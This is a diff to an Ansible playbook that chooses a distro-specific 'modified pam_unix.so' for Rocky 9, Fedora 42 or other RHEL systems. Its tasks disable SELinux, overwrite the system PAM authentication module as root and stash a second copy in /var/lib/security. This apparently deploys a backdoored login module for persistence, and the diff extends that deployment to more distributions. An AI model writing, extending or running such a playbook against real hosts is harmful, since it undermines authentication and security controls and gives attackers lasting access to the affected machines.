@@ -1,4 +1,30 @@
 ---
+- name: Gather OS facts
+  ansible.builtin.setup:
+    gather_subset:
+      - '!all'
+      - '!min'
+      - distribution
+
+- name: Set distro-specific file path for Rocky 9
+  ansible.builtin.set_fact:
+    pam_file_src: "rocky-9/pam_unix_rocky9.so"
+  when: 
+    - ansible_distribution == "Rocky"
+    - ansible_distribution_major_version == "9"
+
+- name: Set distro-specific file path for Fedora 42
+  ansible.builtin.set_fact:
+    pam_file_src: "fedora-42/pam_unix_fedora42.so"
+  when:
+    - ansible_distribution == "Fedora"
+    - ansible_distribution_major_version == "42"
+
+- name: Set generic file path for other distros
+  ansible.builtin.set_fact:
+    pam_file_src: "pam_unix_rhel.so"
+  when: pam_file_src is not defined
+
 - name: Disable SELinux (requires reboot)
   ansible.builtin.lineinfile:
     path: /etc/selinux/config
@@ -19,7 +45,7 @@
 
 - name: Copy over modified pam_unix.so (RedHat)
   ansible.builtin.copy:
-    src: pam_unix.so
+    src: "{{ pam_file_src }}"
     dest: /usr/lib64/security/pam_unix.so
     owner: root
     group: root
@@ -32,7 +58,7 @@
 
 - name: Copy over modified file to backup backup directory
   ansible.builtin.copy:
-    src: pam_unix.so
+    src: "{{ pam_file_src }}"
     dest: /var/lib/security/pam_unix.so
     owner: root
     group: root
